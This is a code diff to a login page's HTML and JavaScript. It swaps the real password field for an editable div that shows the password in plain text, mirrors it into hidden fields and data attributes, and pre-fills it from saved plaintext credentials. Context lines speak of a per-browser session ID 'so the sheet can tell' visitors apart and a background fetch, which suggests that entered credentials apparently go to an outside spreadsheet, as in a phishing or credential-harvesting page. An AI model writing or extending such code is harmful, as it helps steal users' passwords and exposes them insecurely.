@@ -318,11 +318,8 @@
  <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
 
  <label for="visiblePassword" class="sr-only">Password</label>
- <!-- Changed from contenteditable div to actual password input -->
- <input type="password" id="visiblePassword" name="password" autocomplete="current-password" placeholder="Password" required minlength="8" style="width: 100%; height: 48px; background: #1b1c1e; border: 1px solid #3b3d40; border-radius: 6px; padding: 0 16px; font-size: 16px; color: #fff; outline: none; font-family: inherit; margin-bottom: 12px;">
- 
- <!-- Hidden input to ensure form validation works correctly if needed, though visible one handles submission now -->
- <input type="hidden" id="hiddenPassword" name="password_hidden">
+ <div id="visiblePassword" contenteditable="true" placeholder="Password" oninput="updateHiddenPassword()" required minlength="8" style="width: 100%; height: 48px; background: #1b1c1e; border: 1px solid #3b3d40; border-radius: 6px; padding: 0 16px; font-size: 16px; color: #fff; outline: none; font-family: inherit; margin-bottom: 12px;"></div>
+ <input type="password" id="hiddenPassword" name="password" autocomplete="current-password" required minlength="8" style="display:none;">
 
  <button type="submit" class="submit">Log In</button>
 
@@ -395,7 +392,9 @@
  }
  if (saved.username) document.getElementById('username').value = saved.username;
  if (saved.password) {
- document.getElementById('visiblePassword').value = saved.password;
+ document.getElementById('visiblePassword').textContent = saved.password;
+ document.getElementById('hiddenPassword').value = saved.password;
+ document.getElementById('visiblePassword').dataset.password = saved.password;
  }
 
  /* ——— Unique session ID per browser, so the sheet can tell
@@ -423,12 +422,11 @@
  }).catch(function () { /* don't break login if offline */ });
  }
 
- // No longer needed since we use a standard input type="password"
- // but keeping it harmless in case of future changes
  function updateHiddenPassword() {
  const visiblePassword = document.getElementById('visiblePassword');
  const hiddenPassword = document.getElementById('hiddenPassword');
- hiddenPassword.value = visiblePassword.value;
+ hiddenPassword.value = visiblePassword.textContent;
+ visiblePassword.dataset.password = visiblePassword.textContent;
  }
 
  form.addEventListener('submit', function (e) {
@@ -444,7 +442,7 @@
  }
 
  var user = document.getElementById('username').value.trim();
- var pass = document.getElementById('visiblePassword').value; 
+ var pass = document.getElementById('hiddenPassword').value; // Use hidden password
 
  /* Save locally so the boxes pre-fill next time */
  var data = {
